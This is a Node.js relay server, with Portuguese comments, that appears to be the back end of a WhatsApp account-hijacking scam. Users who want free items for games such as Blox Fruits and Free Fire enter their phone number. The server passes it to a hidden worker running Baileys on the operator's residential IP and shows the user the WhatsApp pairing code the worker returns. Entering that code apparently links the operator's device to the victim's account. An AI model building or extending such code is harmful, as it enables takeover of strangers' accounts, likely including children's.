/**
 * server.js - Relay server (Render/cloud).
 * NÃO roda Baileys aqui. Apenas repassa mensagens entre:
 *   - Navegadores dos usuários (socket.io clients)
 *   - Worker local (roda no PC do dono com IP residencial)
 */
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname  = dirname(__filename);

const app    = express();
const server = createServer(app);
const io     = new Server(server, {
    cors: { origin: '*' },
    pingTimeout:  60000,
    pingInterval: 25000
});

// Serve static files
app.use(express.static(join(__dirname, 'public')));

// ---- Config ----
const WORKER_SECRET = process.env.WORKER_SECRET || 'donate-worker-2025';

// ---- Games config ----
const OUT_OF_STOCK = new Set([]); // bloqueados ANTES do WhatsApp

// ---- Worker socket (somente 1 worker por vez) ----
let workerSocket = null;

// ---- Socket.io ----
io.on('connection', (socket) => {

    // ---- Worker connection ----
    if (socket.handshake.auth?.role === 'worker') {
        if (socket.handshake.auth?.secret !== WORKER_SECRET) {
            console.warn(`[WORKER] Tentativa com secret inválido de ${socket.handshake.address}`);
            socket.emit('authError', 'Secret inválido.');
            socket.disconnect();
            return;
        }

        console.log(`🔧  Worker conectado: ${socket.id}`);
        workerSocket = socket;

        // Worker → relay → usuário
        socket.on('pairingCode',        ({ userSocketId, code })        => io.to(userSocketId).emit('pairingCode',    { code }));
        socket.on('workerConnected',    ({ userSocketId, credentials }) => io.to(userSocketId).emit('connected',       credentials));
        socket.on('workerOutOfStock',   ({ userSocketId })               => io.to(userSocketId).emit('outOfStock',     {}));
        socket.on('workerError',        ({ userSocketId, message })      => io.to(userSocketId).emit('error',          { message }));
        socket.on('workerSessionExpired', ({ userSocketId, message })    => io.to(userSocketId).emit('sessionExpired', { message }));

        socket.on('disconnect', () => {
            console.log('🔧  Worker desconectado.');
            workerSocket = null;
        });

        return; // Não continua para lógica de usuário
    }

    // ---- User (browser) connection ----
    console.log(`👤  Cliente conectado: ${socket.id}`);

    socket.on('requestSession', (data) => {
        const { gameType, phone } = data;

        // Validações básicas
        const validGames = ['blox-fruits', 'free-fire', 'grow-garden'];
        if (!validGames.includes(gameType)) {
            socket.emit('error', { message: 'Tipo de jogo inválido.' });
            return;
        }

        if (OUT_OF_STOCK.has(gameType)) {
            socket.emit('outOfStock', {});
            return;
        }

        const cleanPhone = (phone || '').replace(/\D/g, '');
        if (!cleanPhone || cleanPhone.length < 12 || cleanPhone.length > 13) {
            socket.emit('error', { message: 'Número de telefone inválido.' });
            return;
        }

        // Verifica se o worker está online
        if (!workerSocket?.connected) {
            socket.emit('error', {
                message: 'Serviço temporariamente offline. Tente novamente em instantes.'
            });
            return;
        }

        console.log(`[${socket.id}] Encaminhando sessão ao worker: ${gameType} | ${cleanPhone}`);
        socket.emit('status', { message: 'Gerando código de verificação...' });

        // Encaminha ao worker
        workerSocket.emit('createSession', {
            userSocketId: socket.id,
            gameType,
            phone: cleanPhone
        });
    });

    socket.on('disconnect', () => {
        console.log(`👤  Cliente desconectado: ${socket.id}`);
        // Avisa o worker para limpar a sessão
        workerSocket?.emit('cleanupSession', { userSocketId: socket.id });
    });
});

// Health check
app.get('/health', (_, res) => {
    res.json({
        status: 'ok',
        workerConnected: !!workerSocket?.connected,
        uptime: process.uptime()
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`\n🌐  Relay server rodando em http://localhost:${PORT}`);
    console.log(`⏳  Aguardando worker local se conectar...\n`);
});
